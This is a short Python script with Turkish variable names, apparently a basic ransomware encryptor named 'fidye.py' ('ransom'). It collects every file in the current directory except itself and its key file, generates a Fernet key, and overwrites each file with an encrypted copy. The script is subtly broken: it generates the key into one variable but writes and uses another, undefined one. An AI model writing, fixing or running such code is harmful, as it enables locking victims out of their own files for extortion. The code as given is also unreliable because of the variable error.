import os 
from cryptography.fernet import Fernet

dosyalar = []

for dosya in os.listdir():
    if dosya == "fidye.py" or dosya == "yazilim.key":
        continue
    if os.path.isfile(dosya):
        dosyalar.append(dosya)
print(dosyalar)

anahtar = Fernet.generate_key()
with open("yazilim.key","wb") as yazilim_dosya:
    yazilim_dosya.write(yazilim)

for dosya in dosyalar:
    with open(dosya,"rb") as okunan_dosya:
        icerik = okunan_dosya.read()
    sifreli_icerik = Fernet(yazilim).encrypt(icerik)
    with open(dosya,"wb") as sifrelenen_dosya:
        sifrelenen_dosya.write(sifreli_icerik)
